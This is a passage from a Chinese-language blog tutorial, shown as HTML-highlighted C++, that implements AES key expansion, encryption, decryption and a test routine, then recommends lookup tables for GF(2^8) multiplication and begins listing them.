class="keyword">int</span> i = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">// w[]的前<span class="number">4</span>个就是输入的key</span><br><span class="line">while(i &lt; Nk)</span><br><span class="line">&#123;</span><br><span class="line">w[i] = <span class="built_in">Word</span>(key[<span class="number">4</span>*i], key[<span class="number">4</span>*i+<span class="number">1</span>], key[<span class="number">4</span>*i+<span class="number">2</span>], key[<span class="number">4</span>*i+<span class="number">3</span>])<span class="comment">;</span></span><br><span class="line">++i<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">i = Nk<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">while(i &lt; <span class="number">4</span>*(Nr+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">temp = w[i-<span class="number">1</span>]<span class="comment">; // 记录前一个word</span></span><br><span class="line">if(i % Nk == <span class="number">0</span>)</span><br><span class="line">w[i] = w[i-Nk] ^ SubWord(RotWord(temp)) ^ Rcon[i/Nk-<span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">else</span><br><span class="line">w[i] = w[i-Nk] ^ temp<span class="comment">;</span></span><br><span class="line">++i<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/******************************下面是加密和解密函数**************************/</span><br><span class="line">/**</span><br><span class="line"> *  加密</span><br><span class="line"> */</span><br><span class="line">void encrypt(<span class="built_in">byte</span> <span class="keyword">in</span>[<span class="number">4</span>*<span class="number">4</span>], <span class="built_in">word</span> w[<span class="number">4</span>*(Nr+<span class="number">1</span>)]) // 输入的是明文和扩展密钥</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">word</span> key[<span class="number">4</span>]<span class="comment">; // 前四个key是w[1-4]</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;4; ++i)</span></span><br><span class="line">key[i] = w[i]<span class="comment">;</span></span><br><span class="line">AddRoundKey(<span class="keyword">in</span>, key)<span class="comment">; // 第一次密钥轮加</span></span><br><span class="line"></span><br><span class="line">for(<span class="keyword">int</span> round=<span class="number">1</span><span class="comment">; round&lt;Nr; ++round) //需要Nr-1次</span></span><br><span class="line">&#123;</span><br><span class="line">SubBytes(<span class="keyword">in</span>)<span class="comment">; //字节替换</span></span><br><span class="line">ShiftRows(<span class="keyword">in</span>)<span class="comment">; //位移位</span></span><br><span class="line">MixColumns(<span class="keyword">in</span>)<span class="comment">; //列混合</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;4; ++i) // 每四个w[]作为密钥轮加的key</span></span><br><span class="line">key[i] = w[<span class="number">4</span>*round+i]<span class="comment">;</span></span><br><span class="line">AddRoundKey(<span class="keyword">in</span>, key)<span class="comment">; //密钥轮加</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 最后一次不需要列混合</span><br><span class="line">SubBytes(<span class="keyword">in</span>)<span class="comment">;</span></span><br><span class="line">ShiftRows(<span class="keyword">in</span>)<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;4; ++i)</span></span><br><span class="line">key[i] = w[<span class="number">4</span>*Nr+i]<span class="comment">;</span></span><br><span class="line">AddRoundKey(<span class="keyword">in</span>, key)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *  解密</span><br><span class="line"> */</span><br><span class="line">void decrypt(<span class="built_in">byte</span> <span class="keyword">in</span>[<span class="number">4</span>*<span class="number">4</span>], <span class="built_in">word</span> w[<span class="number">4</span>*(Nr+<span class="number">1</span>)])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">word</span> key[<span class="number">4</span>]<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;4; ++i)</span></span><br><span class="line">key[i] = w[<span class="number">4</span>*Nr+i]<span class="comment">;</span></span><br><span class="line">AddRoundKey(<span class="keyword">in</span>, key)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">for(<span class="keyword">int</span> round=Nr-<span class="number">1</span><span class="comment">; round&gt;0; --round)</span></span><br><span class="line">&#123;</span><br><span class="line">InvShiftRows(<span class="keyword">in</span>)<span class="comment">;</span></span><br><span class="line">InvSubBytes(<span class="keyword">in</span>)<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;4; ++i)</span></span><br><span class="line">key[i] = w[<span class="number">4</span>*round+i]<span class="comment">;</span></span><br><span class="line">AddRoundKey(<span class="keyword">in</span>, key)<span class="comment">;</span></span><br><span class="line">InvMixColumns(<span class="keyword">in</span>)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">InvShiftRows(<span class="keyword">in</span>)<span class="comment">;</span></span><br><span class="line">InvSubBytes(<span class="keyword">in</span>)<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;4; ++i)</span></span><br><span class="line">key[i] = w[i]<span class="comment">;</span></span><br><span class="line">AddRoundKey(<span class="keyword">in</span>, key)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**********************************************************************/</span><br><span class="line">/*                                                                    */</span><br><span class="line">/*                              测试                                  */</span><br><span class="line">/*                                                                    */</span><br><span class="line">/**********************************************************************/</span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span> key[<span class="number">16</span>] = &#123;<span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span class="number">0x16</span>,</span><br><span class="line"><span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>,</span><br><span class="line"><span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>,</span><br><span class="line"><span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span>&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">byte</span> plain[<span class="number">16</span>] = &#123;<span class="number">0x32</span>, <span class="number">0x88</span>, <span class="number">0x31</span>, <span class="number">0xe0</span>,</span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x5a</span>, <span class="number">0x31</span>, <span class="number">0x37</span>,</span><br><span class="line"><span class="number">0xf6</span>, <span class="number">0x30</span>, <span class="number">0x98</span>, <span class="number">0x07</span>,</span><br><span class="line"><span class="number">0xa8</span>, <span class="number">0x8d</span>, <span class="number">0xa2</span>, <span class="number">0x34</span>&#125;<span class="comment">;</span></span><br><span class="line">// 输出密钥</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;密钥是：&quot;</span><span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;16; ++i)</span></span><br><span class="line">cout &lt;&lt; hex &lt;&lt; key[i].to_ulong() &lt;&lt; <span class="string">&quot; &quot;</span><span class="comment">;</span></span><br><span class="line">cout &lt;&lt; endl<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">word</span> w[<span class="number">4</span>*(Nr+<span class="number">1</span>)]<span class="comment">;</span></span><br><span class="line">KeyExpansion(key, w)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 输出待加密的明文</span><br><span class="line">cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;待加密的明文：&quot;</span>&lt;&lt;endl<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;16; ++i)</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; hex &lt;&lt; plain[i].to_ulong() &lt;&lt; <span class="string">&quot; &quot;</span><span class="comment">;</span></span><br><span class="line">if((i+<span class="number">1</span>)<span class="subst">%4</span> == <span class="number">0</span>)</span><br><span class="line">cout &lt;&lt; endl<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 加密，输出密文</span><br><span class="line">encrypt(plain, w)<span class="comment">;</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;加密后的密文：&quot;</span>&lt;&lt;endl<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;16; ++i)</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; hex &lt;&lt; plain[i].to_ulong() &lt;&lt; <span class="string">&quot; &quot;</span><span class="comment">;</span></span><br><span class="line">if((i+<span class="number">1</span>)<span class="subst">%4</span> == <span class="number">0</span>)</span><br><span class="line">cout &lt;&lt; endl<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 解密，输出明文</span><br><span class="line">decrypt(plain, w)<span class="comment">;</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;解密后的明文：&quot;</span>&lt;&lt;endl<span class="comment">;</span></span><br><span class="line">for(<span class="keyword">int</span> i=<span class="number">0</span><span class="comment">; i&lt;16; ++i)</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; hex &lt;&lt; plain[i].to_ulong() &lt;&lt; <span class="string">&quot; &quot;</span><span class="comment">;</span></span><br><span class="line">if((i+<span class="number">1</span>)<span class="subst">%4</span> == <span class="number">0</span>)</span><br><span class="line">cout &lt;&lt; endl<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl<span class="comment">;</span></span><br><span class="line">return <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-注意-2">2. 注意</h3><p>有限域$ GF(2^8) $上的乘法改用查表的方式实现，<code>AES</code>的加密速度马上提升<code> 80%</code> 以上，所以建议最好使用查表的方式。下面是 <code>AES</code> 算法中用到的 <code>6</code>个乘法结果表：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">byte Mul_02[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x06</span>,<span class="number">0x08</span>,<span class="number">0x0a</span>,<span class="number">0x0c</span>,<span class="number">0x0e</span>,<span class="number">0x10</span>,<span class="number">0x12</span>,<span class="number">0x14</span>,<span class="number">0x16</span>,<span class="number">0x18</span>,<span class="number">0x1a</span>,<span class="number">0x1c</span>,<span class="number">0x1e</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x22</span>,<span class="number">0x24</span>,<span class="number">0x26</span>,<span class="number">0x28</span>,<span class="number">0x2a</span>,<span class="number">0x2c</span>,<span class="number">0x2e</span>,<span class="number">0x30</span>,<span class="number">0x32</span>,<span class="number">0x34</span>,<span class="number">0x36</span>,<span class="number">0x38</span>,<span class="number">0x3a</span>,<span class="number">0x3c</span>,<span class="number">0x3e</span>,</span><br><span class="line"><span class="number">0x40</span>,<span class="number">0x42</span>,<span class="number">0x44</span>,<span class="number">0x46</span>,<span class="number">0x48</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x4e</span>,<span class="number">0x50</span>,<span class="number">0x52</span>,<span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x58</span>,<span class="number">0x5a</span>,<span class="number">0x5c</span>,<span class="number">0x5e</span>,</span><br><span class="line"><span class="number">0x60</span>,<span class="number">0x62</span>,<span class="number">0x64</span>,<span class="number">0x66</span>,<span class="number">0x68</span>,<span class="number">0x6a</span>,<span class="number">0x6c</span>,<span class="number">0x6e</span>,<span class="number">0x70</span>,<span class="number">0x72</span>,<span class="number">0x74</span>,<span class="number">0x76</span>,<span class="number">0x78</span>,<span class="number">0x7a</span>,<span class="number">0x7c</span>,<span class="number">0x7e</span>,</span><br><span class="line"><span class="number">0x80</span>,<span class="number">0x82</span>,<span class="number">0x84</span>,<span class="number">0x86</span>,<span class="number">0x88</span>,<span class="number">0x8a</span>,<span class="number">0x8c</span>,<span class="number">0x8e</span>,<span class="number">0x90</span>,<span class="number">0x92</span>,<span class="number">0x94</span>,<span class="number">0x96</span>,<span class="number">0x98</span>,<span class="number">0x9a</span>,<span class="number">0x9c</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xa0</span>,<span class="number">0xa2</span>,<span class="number">0xa4</span>,<span class="number">0xa6</span>,<span class="number">0xa8</span>,<span class="number">0xaa</span>,<span class="number">0xac</span>,<span class="number">0xae</span>,<span class="number">0xb0</span>,<span class="number">0xb2</span>,<span class="number">0xb4</span>,<span class="number">0xb6</span>,<span class="number">0xb8</span>,<span class="number">0xba</span>,<span class="number">0xbc</span>,<span class="number">0xbe</span>,</span><br><span class="line"><span class="number">0xc0</span>,<span class="number">0xc2</span>,<span class="number">0xc4</span>,<span class="number">0xc6</span>,<span class="number">0xc8</span>,<span class="number">0xca</span>,<span class="number">0xcc</span>,<span class="number">0xce</span>,<span class="number">0xd0</span>,<span class="number">0xd2</span>,<span class="number">0xd4</span>,<span class="number">0xd6</span>,<span class="number">0xd8</span>,<span class="number">0xda</span>,<span class="number">0xdc</span>,<span class="number">0xde</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0xe2</span>,<span class="number">0xe4</span>,<span class="number">0xe6</span>,<span class="number">0xe8</span>,<span class="number">0xea</span>,<span class="number">0xec</span>,<span class="number">0xee</span>,<span class="number">0xf0</span>,<span class="number">0xf2</span>,<span class="number">0xf4</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0xfa</span>,<span class="number">0xfc</span>,<span class="number">0xfe</span>,</span><br><span class="line"><span class="number">0x1b</span>,<span class="number">0x19</span>,<span class="number">0x1f</span>,<span class="number">0x1d</span>,<span class="number">0x13</span>,<span class="number">0x11</span>,<span class="number">0x17</span>,<span class="number">0x15</span>,<span class="number">0x0b</span>,<span class="number">0x09</span>,<span class="number">0x0f</span>,<span class="number">0x0d</span>,<span class="number">0x03</span>,<span class="number">0x01</span>,<span class="number">0x07</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x3b</span>,<span class="number">0x39</span>,<span class="number">0x3f</span>,<span class="number">0x3d</span>,<span class="number">0x33</span>,<span class="number">0x31</span>,<span class="number">0x37</span>,<span class="number">0x35</span>,<span class="number">0x2b</span>,<span class="number">0x29</span>,<span class="number">0x2f</span>,<span class="number">0x2d</span>,<span class="number">0x23</span>,<span class="number">0x21</span>,<span class="number">0x27</span>,<span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x5b</span>,<span class="number">0x59</span>,<span class="number">0x5f</span>,<span class="number">0x5d</span>,<span class="number">0x53</span>,<span class="number">0x51</span>,<span class="number">0x57</span>,<span class="number">0x55</span>,<span class="number">0x4b</span>,<span class="number">0x49</span>,<span class="number">0x4f</span>,<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x47</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0x7b</span>,<span class="number">0x79</span>,<span class="number">0x7f</span>,<span class="number">0x7d</span>,<span class="number">0x73</span>,<span class="number">0x71</span>,<span class="number">0x77</span>,<span class="number">0x75</span>,<span class="number">0x6b</span>,<span class="number">0x69</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x9b</span>,<span class="number">0x99</span>,<span class="number">0x9f</span>,<span class="number">0x9d</span>,<span class="number">0x93</span>,<span class="number">0x91</span>,<span class="number">0x97</span>,<span class="number">0x95</span>,<span class="number">0x8b</span>,<span class="number">0x89</span>,<span class="number">0x8f</span>,<span class="number">0x8d</span>,<span class="number">0x83</span>,<span class="number">0x81</span>,<span class="number">0x87</span>,<span class="number">0x85</span>,</span><br><span class="line"><span class="number">0xbb</span>,<span class="number">0xb9</span>,<span class="number">0xbf</span>,<span class="number">0xbd</span>,<span class="number">0xb3</span>,<span class="number">0xb1</span>,<span class="number">0xb7</span>,<span class="number">0xb5</span>,<span class="number">0xab</span>,<span class="number">0xa9</span>,<span class="number">0xaf</span>,<span class="number">0xad</span>,<span class="number">0xa3</span>,<span class="number">0xa1</span>,<span class="number">0xa7</span>,<span class="number">0xa5</span>,</span><br><span class="line"><span class="number">0xdb</span>,<span class="number">0xd9</span>,<span class="number">0xdf</span>,<span class="number">0xdd</span>,<span class="number">0xd3</span>,<span class="number">0xd1</span>,<span class="number">0xd7</span>,<span class="number">0xd5</span>,<span class="number">0xcb</span>,<span class="number">0xc9</span>,<span class="number">0xcf</span>,<span class="number">0xcd</span>,<span class="number">0xc3</span>,<span class="number">0xc1</span>,<span class="number">0xc7</span>,<span class="number">0xc5</span>,</span><br><span class="line"><span class="number">0xfb</span>,<span class="number">0xf9</span>,<span class="number">0xff</span>,<span class="number">0xfd</span>,<span class="number">0xf3</span>,<span class="number">0xf1</span>,<span class="number">0xf7</span>,<span class="number">0xf5</span>,<span class="number">0xeb</span>,<span class="number">0xe9</span>,<span class="number">0xef</span>,<span class="number">0xed</span>,<span class="number">0xe3</span>,<span class="number">0xe1</span>,<span class="number">0xe7</span>,<span class="number">0xe5</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">byte Mul_03[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x06</span>,<span class="number">0x05</span>,<span class="number">0x0c</span>,<span class="number">0x0f</span>,<span class="number">0x0a</span>,<span class="number">0x09</span>,<span class="number">0x18</span>,<span class="number">0x1b</span>,<span class="number">0x1e</span>,<span class="number">0x1d</span>,<span class="number">0x14</span>,<span class="number">0x17</span>,<span class="number">0x12</span>,<span class="number">0x11</span>,</span><br><span class="line"><span class="number">0x30</span>,<span class="number">0x33</span>,<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x3c</span>,<span class="number">0x3f</span>,<span class="number">0x3a</span>,<span class="number">0x39</span>,<span class="number">0x28</span>,<span class="number">0x2b</span>,<span class="number">0x2e</span>,<span class="number">0x2d</span>,<span class="number">0x24</span>,<span class="number">0x27</span>,<span class="number">0x22</span>,<span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x60</span>,<span class="number">0x63</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x6a</span>,<span class="number">0x69</span>,<span class="number">0x78</span>,<span class="number">0x7b</span>,<span class="number">0x7e</span>,<span class="number">0x7d</span>,<span class="number">0x74</span>,<span class="number">0x77</span>,<span class="number">0x72</span>,<span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x50</span>,<span class="number">0x53</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x5c</span>,<span class="number">0x5f</span>,<span class="number">0x5a</span>,<span class="number">0x59</span>,<span class="number">0x48</span>,<span class="number">0x4b</span>,<span class="number">0x4e</span>,<span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x47</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,</span><br><span class="line"><span class="number">0xc0</span>,<span class="number">0xc3</span>,<span class="number">0xc6</span>,<span class="number">0xc5</span>,<span class="number">0xcc</span>,<span class="number">0xcf</span>,<span class="number">0xca</span>,<span class="number">0xc9</span>,<span class="number">0xd8</span>,<span class="number">0xdb</span>,<span class="number">0xde</span>,<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0xd7</span>,<span class="number">0xd2</span>,<span class="number">0xd1</span>,</span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0xf3</span>,<span class="number">0xf6</span>,<span class="number">0xf5</span>,<span class="number">0xfc</span>,<span class="number">0xff</span>,<span class="number">0xfa</span>,<span class="number">0xf9</span>,<span class="number">0xe8</span>,<span class="number">0xeb</span>,<span class="number">0xee</span>,<span class="number">0xed</span>,<span class="number">0xe4</span>,<span class="number">0xe7</span>,<span class="number">0xe2</span>,<span class="number">0xe1</span>,</span><br><span class="line"><span class="number">0xa0</span>,<span class="number">0xa3</span>,<span class="number">0xa6</span>,<span class="number">0xa5</span>,<span class="number">0xac</span>,<span class="number">0xaf</span>,<span class="number">0xaa</span>,<span class="number">0xa9</span>,<span class="number">0xb8</span>,<span class="number">0xbb</span>,<span class="number">0xbe</span>,<span class="number">0xbd</span>,<span class="number">0xb4</span>,<span class="number">0xb7</span>,<span class="number">0xb2</span>,<span class="number">0xb1</span>,</span><br><span class="line"><span class="number">0x90</span>,<span class="number">0x93</span>,<span class="number">0x96</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0x9f</span>,<span class="number">0x9a</span>,<span class="number">0x99</span>,<span class="number">0x88</span>,<span class="number">0x8b</span>,<span class="number">0x8e</span>,<span class="number">0x8d</span>,<span class="number">0x84</span>,<span class="number">0x87</span>,<span class="number">0x82</span>,<span class="number">0x81</span>,</span><br><span class="line"><span class="number">0x9b</span>,<span class="number">0x98</span>,<span class="number">0x9d</span>,<span class="number">0x9e</span>,<span class="number">0x97</span>,<span class="number">0x94</span>,<span class="number">0x91</span>,<span class="number">0x92</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x85</span>,<span class="number">0x86</span>,<span class="number">0x8f</span>,<span class="number">0x8c</span>,<span class="number">0x89</span>,<span class="number">0x8a</span>,</span><br><span class="line"><span class="number">0xab</span>,<span class="number">0xa8</span>,<span class="number">0xad</span>,<span class="number">0xae</span>,<span class="number">0xa7</span>,<span class="number">0xa4</span>,<span class="number">0xa1</span>,<span class="number">0xa2</span>,<span class="number">0xb3</span>,<span class="number">0xb0</span>,<span class="number">0xb5</span>,<span class="number">0xb6</span>,<span class="number">0xbf</span>,<span class="number">0xbc</span>,<span class="number">0xb9</span>,<span class="number">0xba</span>,</span><br><span class="line"><span class="number">0xfb</span>,<span class="number">0xf8</span>,<span class="number">0xfd</span>,<span class="number">0xfe</span>,<span class="number">0xf7</span>,<span class="number">0xf4</span>,<span class="number">0xf1</span>,<span class="number">0xf2</span>,<span class="number">0xe3</span>,<span class="number">0xe0</span>,<span class="number">0xe5</span>,<span class="number">0xe6</span>,<span class="number">0xef</span>,<span class="number">0xec</span>,<span class="number">0xe9</span>,<span class="number">0xea</span>,</span><br><span class="line"><span class="number">0xcb</span>,<span class="number">0xc8</span>,<span class="number">0xcd</span>,<span class="number">0xce</span>,<span class="number">0xc7</span>,<span class="number">0xc4</span>,<span class="number">0xc1</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xd0</span>,<span class="number">0xd5</span>,<span class="number">0xd6</span>,<span class="number">0xdf</span>,<span class="number">0xdc</span>,<span class="number">0xd9</span>,<span class="number">0xda</span>,</span><br><span class="line"><span class="number">0x5b</span>,<span class="number">0x58</span>,<span class="number">0x5d</span>,<span class="number">0x5e</span>,<span class="number">0x57</span>,<span class="number">0x54</span>,<span class="number">0x51</span>,<span class="number">0x52</span>,<span class="number">0x43</span>,<span class="number">0x40</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x4f</span>,<span class="number">0x4c</span>,<span class="number">0x49</span>,<span class="number">0x4a</span>,</span><br><span class="line"><span class="number">0x6b</span>,<span class="number">0x68</span>,<span class="number">0x6d</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x73</span>,<span class="number">0x70</span>,<span class="number">0x75</span>,<span class="number">0x76</span>,<span class="number">0x7f</span>,<span class="number">0x7c</span>,<span class="number">0x79</span>,<span class="number">0x7a</span>,</span><br><span class="line"><span class="number">0x3b</span>,<span class="number">0x38</span>,<span class="number">0x3d</span>,<span class="number">0x3e</span>,<span class="number">0x37</span>,<span class="number">0x34</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x23</span>,<span class="number">0x20</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x2f</span>,<span class="number">0x2c</span>,<span class="number">0x29</span>,<span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0x0b</span>,<span class="number">0x08</span>,<span class="number">0x0d</span>,<span class="number">0x0e</span>,<span class="number">0x07</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x13</span>,<span class="number">0x10</span>,<span class="number">0x15</span>,<span class="number">0x16</span>,<span class="number">0x1f</span>,<span class="number">0x1c</span>,<span class="number">0x19</span>,<span class="number">0x1a</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">byte Mul_09[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0x12</span>,<span class="number">0x1b</span>,<span class="number">0x24</span>,<span class="number">0x2d</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0x48</span>,<span class="number">0x41</span>,<span class="number">0x5a</span>,<span class="number">0x53</span>,<span class="number">0x6c</span>,<span class="number">0x65</span>,<span class="number">0x7e</span>,<span class="number">0x77</span>,</span><br><span class="line"><span class="number">0x90</span>,<span class="number">0x99</span>,<span class="number">0x82</span>,<span class="number">0x8b</span>,<span class="number">0xb4</span>,<span class="number">0xbd</span>,<span class="number">0xa6</span>,<span class="number">0xaf</span>,<span class="number">0xd8</span>,<span class="number">0xd1</span>,<span class="number">0xca</span>,<span class="number">0xc3</span>,<span class="number">0xfc</span>,<span class="number">0xf5</span>,<span class="number">0xee</span>,<span class="number">0xe7</span>,</span><br><span class="line"><span class="number">0x3b</span>,<span class="number">0x32</span>,<span class="number">0x29</span>,<span class="number">0x20</span>,<span class="number">0x1f</span>,<span class="number">0x16</span>,<span class="number">0x0d</span>,<span class="number">0x04</span>,<span class="number">0x73</span>,<span class="number">0x7a</span>,<span class="number">0x61</span>,<span class="number">0x68</span>,<span class="number">0x57</span>,<span class="number">0x5e</span>,<span class="number">0x45</span>,<span class="number">0x4c</span>,</span><br><span class="line"><span class="number">0xab</span>,<span class="number">0xa2</span>,<span class="number">0xb9</span>,<span class="number">0xb0</span>,<span class="number">0x8f</span>,<span class="number">0x86</span>,<span class="number">0x9d</span>,<span class="number">0x94</span>,<span class="number">0xe3</span>,<span class="number">0xea</span>,<span class="number">0xf1</span>,<span class="number">0xf8</span>,<span class="number">0xc7</span>,<span class="number">0xce</span>,<span class="number">0xd5</span>,<span class="number">0xdc</span>,</span><br><span class="line"><span class="number">0x76</span>,<span class="number">0x7f</span>,<span class="number">0x64</span>,<span class="number">0x6d</span>,<span class="number">0x52</span>,<span class="number">0x5b</span>,<span class="number">0x40</span>,<span class="number">0x49</span>,<span class="number">0x3e</span>,<span class="number">0x37</span>,<span class="number">0x2c</span>,<span class="number">0x25</span>,<span class="number">0x1a</span>,<span class="number">0x13</span>,<span class="number">0x08</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0xe6</span>,<span class="number">0xef</span>,<span class="number">0xf4</span>,<span class="number">0xfd</span>,<span 